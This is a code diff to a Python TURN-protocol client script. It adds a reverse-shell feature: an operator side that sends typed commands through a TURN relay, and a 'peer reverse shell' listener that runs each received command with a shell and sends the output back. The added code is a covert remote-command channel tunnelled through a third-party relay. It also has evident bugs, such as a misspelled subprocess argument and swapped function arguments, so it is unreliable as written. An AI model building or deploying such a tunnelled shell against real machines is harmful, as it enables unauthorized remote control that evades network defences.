@@ -1,8 +1,10 @@
 import asyncio
+import random
 import socket
 import struct
 import time
 import packetBuilder
+import subprocess
 
 ## MESSAGE TYPES
 STUN_MESSAGE_TYPES = {
@@ -31,7 +33,7 @@ STUN_MESSAGE_TYPES = {
 }
 
 # TEST CLIENT for demo
-# Start client ##
+## Start client ##
 async def start_client(ip, port):
     turn_server = ip             # TURN server's IP
     turn_port = int(port)        # Default TURN port most likely
@@ -129,8 +131,7 @@ async def start_send_client(ip, port):
         # kill = build_kill_refresh()
         # sock.sendto(kill, TURN_SERVER)
         
-## LISTENER CLIENT
-
+## LISTENER CLIENT - GET FILE ???
 async def start_listener_client(ip, port):
     turn_server = ip             # TURN server's IP
     turn_port = int(port)        # Default TURN port most likely
@@ -166,6 +167,153 @@ async def start_listener_client(ip, port):
     
     ## Maintain connection with refresh packets
     asyncio.create_task(send_refresh(sock, TURN_SERVER))
+    
+## Start Remote Connection ##
+async def get_shell(ip ,port):
+    turn_server = ip             # TURN server's IP
+    turn_port = int(port)        # Default TURN port most likely
+    peer_ip = input("IP of Peer: ")
+    peer_port = int(input("Port of peer: "))
+    TURN_SERVER = tuple([turn_server, int(turn_port)])
+    alloc_packet = packetBuilder.build_alloc()
+    create_perm_packet = packetBuilder.build_createPerm(peer_ip, peer_port)
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.settimeout(None)  # Set a timeout for the response (5 seconds)
+    
+    try:
+        # Send the Allocate packet to the TURN server
+        print(f"Sending packet to {turn_server}:{turn_port}")
+        sock.sendto(alloc_packet, TURN_SERVER)
+        
+        # Receive the response from the TURN server
+        response, addr = sock.recvfrom(4096)  # 4096 bytes buffer size
+        print(f"Received response from {addr}")
+
+        if response:
+            print("Response (hex):", response.hex())
+            read_server_response(response)
+            
+        # Send the Create Perm packet to the TURN server
+        print(f"Sending packet to {turn_server}:{turn_port}")
+        sock.sendto(create_perm_packet, TURN_SERVER)
+        
+        # Receive the response from the TURN server
+        response, addr = sock.recvfrom(4096)  # 4096 bytes buffer size
+        print(f"Received response from {addr}")
+
+        if response:
+            print("Response (hex):", response.hex())
+            read_server_response(response)
+
+    except socket.timeout:
+        print("No response received (timeout).")
+    except Exception as e:
+       print(f"Error: {e}")    
+            
+    ## Maintain connection with refresh packets
+    asyncio.create_task(send_refresh(sock, TURN_SERVER))
+    
+    ## Begin Getting shell
+    # Channel number must be between those values (in RFC)
+    channel_number = random.randint(0x4000, 0x7FFF)
+    print(f"CHANNEL NUMBER: {channel_number}")
+    channel_bind_packet = packetBuilder.build_channelBind(peer_ip, peer_port, channel_number)
+    sock.sendto(channel_bind_packet, TURN_SERVER)
+    
+    response, addr = sock.recvfrom(4096)  # 4096 bytes buffer size
+    print(f"Received response from {addr}")
+
+    if response:
+        print("Response (hex):", response.hex())
+        read_server_response(response)
+        
+    ## Receive shell response
+    asyncio.create_task(receive_shell_response(sock))
+    
+    ## SEND COMMANDS LOOP
+    while True:
+        command = input("Send a command(q to quit): ")
+        
+        if(command == "q"):
+            break
+        send = packetBuilder.build_channelData(channel_number, command.strip())
+        sock.sendto(send, TURN_SERVER) 
+    
+## Receive Shell Response from Peer
+async def receive_shell_response(sock):
+    while True:
+        response, addr = await asyncio.get_event_loop().sock_recvfrom(sock, 4096)
+        print(f"Received response from {addr} at {time.strftime('%H:%M:%S')}")
+
+        if response:
+            print(f"\n[Response from Peer]: {response.decode('utf-8')}\n")
+        
+        await asyncio.sleep(0.1)
+    
+## PEER REVERSE SHELL ##
+async def start_shell_listener(ip, port, channel_number):
+    turn_server = ip             # TURN server's IP
+    turn_port = int(port)        # Default TURN port most likely
+    TURN_SERVER = tuple([turn_server, int(turn_port)])
+    client_ip = input("IP of Client: ")
+    client_port = int(input("Port of Client: "))
+    alloc_packet = packetBuilder.build_alloc()
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.setblocking(False)
+    sock.settimeout(None)  # Set a timeout for the response (5 seconds)
+    sock.bind(('0.0.0.0', int(port)))
+    
+    try:
+        # Send the Allocate packet to the TURN server
+        print(f"Sending packet to {turn_server}:{turn_port}")
+        sock.sendto(alloc_packet, TURN_SERVER)
+        
+        # Receive the response from the TURN server
+        response, addr = await asyncio.get_event_loop().sock_recvfrom(sock, 4096)
+        print(f"Received response from {addr}")
+
+        if response:
+            print("Response (hex):", response.hex())
+            read_server_response(response)
+
+    except socket.timeout:
+        print("No response received (timeout).")
+    except Exception as e:
+       print(f"Error: {e}")  
+    
+    ## Maintain connection with refresh packets
+    asyncio.create_task(send_refresh(sock, TURN_SERVER))
+    
+    # Channel bind
+    channel_bind_packet = packetBuilder.build_channelBind(client_ip, client_port, channel_number)
+    sock.sendto(channel_bind_packet, TURN_SERVER)
+    
+    ## LISTEN FOR COMMANDS AND SEND RESULTS BACK
+    asyncio.create_task(receive_execute_commands(sock, TURN_SERVER, channel_number))
+    
+async def receive_execute_commands(sock, TURN_SERVER, channel_number):
+    while True:
+        response, addr = await asyncio.get_event_loop().sock_recvfrom(sock, 4096)
+        print(f"Received command from {addr} at {time.strftime('%H:%M:%S')}")
+
+        command = response.decode('utf-8').strip()
+        
+        if command.lower() == "exit":
+            print("Exiting listener...")
+            break
+        
+        result = subprocess.run(command, shell=True, capture_output=True, test=True)
+        output = result.stdout if result.stdout else result.stderr
+        output = output.strip() if output else "EXECUTION WITH NO OUTPUT..."
+        
+        ## Send output back
+        send_data_packet = packetBuilder.build_channelData(output, channel_number)
+        sock.sendto(send_data_packet, TURN_SERVER)
+        print(f"Sent command output back to client.")
+        
+        await asyncio.sleep(0.1)
             
 async def receive_response(sock):
     while True:
